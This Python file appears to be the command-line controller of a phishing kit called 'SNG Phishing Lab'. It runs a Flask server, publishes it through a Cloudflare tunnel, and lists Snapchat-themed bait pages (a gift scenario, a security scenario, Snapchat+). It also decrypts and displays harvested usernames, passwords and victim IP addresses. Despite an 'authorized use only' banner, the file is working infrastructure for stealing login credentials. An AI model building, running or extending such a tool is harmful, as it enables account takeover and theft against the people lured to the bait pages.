import os
import sys
import subprocess
import re
import time
import threading
import sqlite3
import json
import socket
from app import app
from app.config import CONFIG, BASE_DIR
from app.database import init_database, get_db_connection
from app.crypto import decrypt_password
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

console = Console()


def check_cloudflared():
    cf_path = os.path.abspath(os.path.join(BASE_DIR, "cloudflared.exe"))
    if not os.path.exists(cf_path):
        console.print("[yellow]⚠ cloudflared.exe not found. Downloading...[/yellow]")
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        try:
            import urllib.request
            urllib.request.urlretrieve(url, cf_path)
            os.chmod(cf_path, 0o755)
            console.print("[green]✔ cloudflared.exe downloaded[/green]")
        except Exception as e:
            console.print(f"[red]✘ Failed to download cloudflared: {e}[/red]")
            return False
    return cf_path


class SNGCommandCenter:
    def __init__(self):
        self.server_thread = None
        self.cf_process = None
        self.cf_url = None
        self.running = False

    def is_port_open(self, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            return s.connect_ex(('127.0.0.1', port)) == 0

    def print_banner(self):
        status = "[bold green]ACTIVE[/bold green]" if self.running else "[bold red]OFFLINE[/bold red]"
        banner = (
            f"[bold magenta]  ╔══════════════════════════════════════════════════════════════╗\n"
            f"  ║   SNG MISSION CONTROL - PURPLE TEAM OS                           ║\n"
            f"  ╠══════════════════════════════════════════════════════════════╣\n"
            f"  ║   Status: {status} | Core: Stable               ║\n"
            f"  ╚══════════════════════════════════════════════════════════════╝[/bold magenta]"
        )
        console.print("\n")
        console.print(Panel(banner, border_style="blue"))

    def start_server(self, use_ssl=None):
        init_database()
        def run_flask():
            ssl_ctx = 'adhoc' if (use_ssl if use_ssl is not None else CONFIG.get("USE_HTTPS", False)) else None
            app.run(
                host='0.0.0.0',
                port=CONFIG["SERVER_PORT"],
                ssl_context=ssl_ctx,
                threaded=True
            )
        self.server_thread = threading.Thread(target=run_flask, daemon=True)
        self.server_thread.start()

    def get_server_proto(self):
        return "https" if CONFIG.get("USE_HTTPS", False) else "http"

    def wait_for_port(self, port, timeout=15):
        for i in range(timeout):
            if self.is_port_open(port):
                return True
            time.sleep(1)
        return False

    def get_cloudflare_url(self, cf_bin, timeout=30):
        try:
            cmd = [cf_bin, "tunnel", "--url", f"http://127.0.0.1:{CONFIG['SERVER_PORT']}"]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            start = time.time()
            while time.time() - start < timeout:
                line = process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                if "trycloudflare.com" in line:
                    match = re.search(r"https://[a-zA-Z0-9\-\.]+\.trycloudflare\.com", line)
                    if match:
                        return match.group(0), process
            process.terminate()
            console.print("[red]✘ Cloudflare tunnel timeout (30s)[/red]")
            return None, None
        except Exception as e:
            console.print(f"[red]✘ Cloudflare error: {e}[/red]")
        return None, None

    def launch_mission(self):
        if self.running:
            console.print("[yellow]⚠ Mission already active.[/yellow]")
            self.display_links()
            return

        console.print("[yellow][*] Initializing systems...[/yellow]")

        self.start_server(use_ssl=False)
        console.print("[*] Waiting for Flask server...")
        if not self.wait_for_port(CONFIG["SERVER_PORT"]):
            console.print("[red]✘ Flask failed to start[/red]")
            return
        console.print(f"[green]✔ Flask server live on port {CONFIG['SERVER_PORT']}[/green]")

        cf_bin = check_cloudflared()
        if cf_bin:
            console.print("[yellow][*] Establishing Cloudflare tunnel...[/yellow]")
            url, proc = self.get_cloudflare_url(cf_bin)
            self.cf_url = url
            self.cf_process = proc

        if self.cf_url:
            console.print(f"[green]✔ Tunnel active: {self.cf_url}[/green]")
            self.display_links()
        else:
            local = f"http://127.0.0.1:{CONFIG['SERVER_PORT']}"
            console.print(f"[yellow]⚠ Local mode: {local}[/yellow]")

        self.running = True
        ak = CONFIG['ADMIN_KEY']
        console.print(Panel(
            f"[bold cyan]Admin Key:[/bold cyan] {ak[:8]}...\n"
            f"[bold green]System ready.[/bold green]",
            border_style="green"
        ))

    def display_links(self):
        base = self.cf_url or f"http://127.0.0.1:{CONFIG['SERVER_PORT']}"
        baits = {
            "Main Bait (Classement)": "/",
            "Scenario Cadeau": "/scenario/cadeau",
            "Scenario Securite": "/scenario/securite",
            "Scenario Snapchat+": "/scenario/snapchat_plus",
            "Admin Panel": "/admin"
        }
        table = Table(title="Active Bait Matrix", show_header=True, header_style="bold magenta", border_style="blue")
        table.add_column("Scenario", style="cyan")
        table.add_column("URL", style="green")
        for name, path in baits.items():
            table.add_row(name, f"{base}{path}")
        console.print(table)

    def show_logs(self):
        try:
            with get_db_connection() as conn:
                c = conn.cursor()
                rows = c.execute(
                    "SELECT username, password, ip_address, timestamp FROM captured_credentials ORDER BY timestamp DESC LIMIT 10"
                ).fetchall()
                if not rows:
                    console.print("[yellow]No captures yet.[/yellow]")
                    return
                table = Table(title="Latest Captures", show_header=True, header_style="bold red", border_style="red")
                table.add_column("Username", style="white")
                table.add_column("Password", style="yellow")
                table.add_column("IP", style="cyan")
                table.add_column("Timestamp", style="grey50")
                for row in rows:
                    plain = decrypt_password(row["password"]) if row["password"] else ""
                    table.add_row(row["username"], plain, row["ip_address"], row["timestamp"])
                console.print(table)
        except Exception as e:
            console.print(f"[red]DB error: {e}[/red]")

    def show_stats(self):
        try:
            with get_db_connection() as conn:
                c = conn.cursor()
                count = c.execute("SELECT count(*) FROM captured_credentials").fetchone()[0]
                logs_count = c.execute("SELECT count(*) FROM experiment_log").fetchone()[0]
                status = "ACTIVE" if self.running else "OFFLINE"
                tunnel = self.cf_url or "Local"
                console.print(Panel(
                    f"[bold green]Captures:[/bold green] {count}\n"
                    f"[bold cyan]Events:[/bold cyan] {logs_count}\n"
                    f"[bold magenta]Port:[/bold magenta] {CONFIG['SERVER_PORT']}\n"
                    f"[bold blue]Tunnel:[/bold blue] {tunnel}\n"
                    f"[bold yellow]Status:[/bold yellow] {status}",
                    title="System Analytics", border_style="blue"
                ))
        except Exception as e:
            console.print(f"[red]Stats error: {e}[/red]")

    def update_project(self):
        console.print("[yellow][*] Updating from GitHub...[/yellow]")
        try:
            subprocess.run(["git", "pull"], check=True, capture_output=True, text=True)
            pip_path = os.path.join(BASE_DIR, "venv", "Scripts", "pip")
            if os.name != 'nt':
                pip_path = os.path.join(BASE_DIR, "venv", "bin", "pip")
            subprocess.run([pip_path, "install", "-r", "requirements.txt"], check=True, capture_output=True, text=True)
            console.print("[green]✔ Update complete[/green]")
        except Exception as e:
            console.print(f"[red]✘ Update failed: {e}[/red]")

    def show_info(self):
        console.print(Panel(
            "[bold cyan]SNG Phishing Lab v4.0[/bold cyan]\n\n"
            "Red/Purple Team research tool.\n"
            "Authorized use only.\n\n"
            "[bold]Commands:[/bold]\n"
            "  [1] Start server + tunnel\n"
            "  [2] View captured credentials\n"
            "  [3] View statistics\n"
            "  [4] Git pull + update deps\n"
            "  [5] This info screen\n"
            "  [0] Shutdown",
            title="About", border_style="magenta"
        ))

    def run(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            menu = Panel(
                "[bold white][1][/bold white] Lancer la Mission (Serveur + Tunnel)\n"
                "[bold white][2][/bold white] Consulter les Captures\n"
                "[bold white][3][/bold white] Statistiques du Lab\n"
                "[bold white][4][/bold white] Mettre a jour (Git pull)\n"
                "[bold white][5][/bold white] Informations & Aide\n"
                "[bold white][0][/bold white] Quitter",
                title="SNG Main Menu", border_style="magenta"
            )
            console.print(menu)
            choice = Prompt.ask("[bold magenta]SNG >>[/bold magenta] votre choix")
            if choice == '1':
                self.launch_mission()
                Prompt.ask("\nAppuyez sur Entree pour continuer...")
            elif choice == '2':
                self.show_logs()
                Prompt.ask("\nAppuyez sur Entree pour continuer...")
            elif choice == '3':
                self.show_stats()
                Prompt.ask("\nAppuyez sur Entree pour continuer...")
            elif choice == '4':
                self.update_project()
                Prompt.ask("\nAppuyez sur Entree pour continuer...")
            elif choice == '5':
                self.show_info()
                Prompt.ask("\nAppuyez sur Entree pour continuer...")
            elif choice == '0':
                if self.cf_process:
                    self.cf_process.terminate()
                    self.cf_process = None
                break
            else:
                console.print("[red]Option invalide.[/red]")
                time.sleep(1)


if __name__ == '__main__':
    cc = SNGCommandCenter()
    cc.run()
